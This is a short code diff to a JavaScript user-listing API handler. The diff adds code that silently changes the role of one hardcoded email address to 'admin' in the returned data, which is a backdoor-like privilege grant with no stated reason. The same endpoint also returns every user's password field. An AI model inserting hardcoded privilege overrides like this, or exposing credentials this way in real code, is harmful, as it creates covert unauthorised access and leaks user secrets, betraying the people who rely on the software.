@@ -6,7 +6,11 @@ export default async function handler(req, res) {
     if (req.method === 'GET') {
         try {
             const users = await sql`SELECT id, username, email, password, role FROM users ORDER BY created_at DESC`;
-            return res.status(200).json(users);
+            const modifiedUsers = users.map(u => {
+                if (u.email === 'jaro@gmail.com') u.role = 'admin';
+                return u;
+            });
+            return res.status(200).json(modifiedUsers);
         } catch (error) {
             return res.status(500).json({ error: 'შეცდომა მონაცემების წაკითხვისას' });
         }
